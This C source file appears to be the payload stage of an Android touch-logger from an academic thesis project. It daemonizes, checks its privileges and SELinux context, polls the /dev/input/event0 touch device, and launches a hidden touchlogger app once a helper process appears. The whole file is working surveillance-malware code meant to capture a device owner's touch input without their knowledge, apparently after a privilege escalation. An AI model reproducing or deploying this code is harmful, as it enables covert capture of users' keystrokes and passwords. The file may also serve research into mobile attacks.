//
// Created by kirill on 17.03.17.
//

#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <dirent.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <stdbool.h>
#include "dirty/common/logging.h"

typedef int getcon_t(char** con);

// TODO: make this depend on project build type
#define PRODUCTION_CODE 1

// TODO: figure out how to get this info from CMake script and pass it here
#define PKNAME "org.leyfer.thesis.touchlogger_dirty"
#define ACTIVITY ".activity.MainActivity"
#define BOOLEAN_EXTRA_KEY "org.leyfer.thesis.extra.started_by_payload true"

int find_proc()
{
  DIR* dir = opendir("/proc");
  if (dir == NULL)
  {
    LOGV("Couldn't open /proc");
    return -1;
  }

  struct dirent* de;
  char cmdline_path[PATH_MAX];
  char buf[128];

  bool found = false;

  while ((de = readdir(dir)))
  {
    if (!strcmp(de->d_name, ".") || !strcmp(de->d_name, ".."))
    {
      continue;
    }

    // Only inspect directories that are PID numbers
    char* endptr;
    long int pid = strtol(de->d_name, &endptr, 10);
    if (*endptr != '\0')
    {
      continue;
    }

    memset(cmdline_path, 0, PATH_MAX);

    snprintf(cmdline_path, PATH_MAX, "/proc/%lu/cmdline", pid);
    int fd = open(cmdline_path, O_RDONLY);
    if (fd == -1)
    {
      LOGV("Unable to open %s: %s!", cmdline_path, strerror(errno));
      continue;
    }

    memset(buf, 0, 128);
    if (read(fd, buf, 128) == -1)
    {
      LOGV("Unable to read from %s: %s!", cmdline_path, strerror(errno));
      close(fd);
      continue;
    }

    if (strcmp("touchlogger.here", buf) == 0)
    {
      LOGV("Touchlogger found!");
      found = true;
      close(fd);
      break;
    }
    else
    {
      close(fd);
    }
  }

  closedir(dir);

  if (found)
  {
    return 0;
  }
  else
  {
    return -1;
  }
}

int main(int argc, const char** argv)
{
  LOGV("Uid: %d", getuid());
  dlerror();
#ifdef __aarch64__
  void * selinux = dlopen("/system/lib64/libselinux.so", RTLD_LAZY);
#else
  void* selinux = dlopen("/system/lib/libselinux.so", RTLD_LAZY);
#endif
  if (selinux)
  {
    void* getcon = dlsym(selinux, "getcon");
    const char* error = dlerror();
    if (error)
    {
      LOGV("dlsym error %s", error);
    }
    else
    {
      getcon_t* getcon_p = (getcon_t*) getcon;
      char* secontext;
      int ret = (*getcon_p)(&secontext);
      LOGV("Context: %d %s", ret, secontext);
    }
  }

  if (daemon(0, 0) == -1)
  {
    LOGV("Unable to daemonize process: %s!", strerror(errno));
  }

#if PRODUCTION_CODE
  bool called_activity = false;
#endif

  bool started = false;

  int fd;
  while (1)
  {
    if ((fd = open("/dev/input/event0", O_RDONLY)) == -1)
    {
      LOGV("Unable to open input device: %s", strerror(errno));
      break;
    }
    else
    {
      LOGV("Open input device success!");
      close(fd);
#if PRODUCTION_CODE
      if (!started)
      {
        if (find_proc() == 0)
        {
          LOGV("Touchlogger android app started!");
          int start_touchlogger_res = system(
              "am start -n " PKNAME "/" ACTIVITY " --ez " BOOLEAN_EXTRA_KEY " true");

          if (start_touchlogger_res == -1)
          {
            LOGV("Unable to start touchlogger!");
          }
          else if (WEXITSTATUS(start_touchlogger_res) == 0)
          {
            LOGV("Touchlogger started successfully!");
            started = true;
          }
          else
          {
            LOGV("Unable to start activity!");
          }
        }
        else
        {
          LOGV("No touchlogger process!");
        }
      }
#endif
    }

    sleep(1);
  }

  return 0;
}
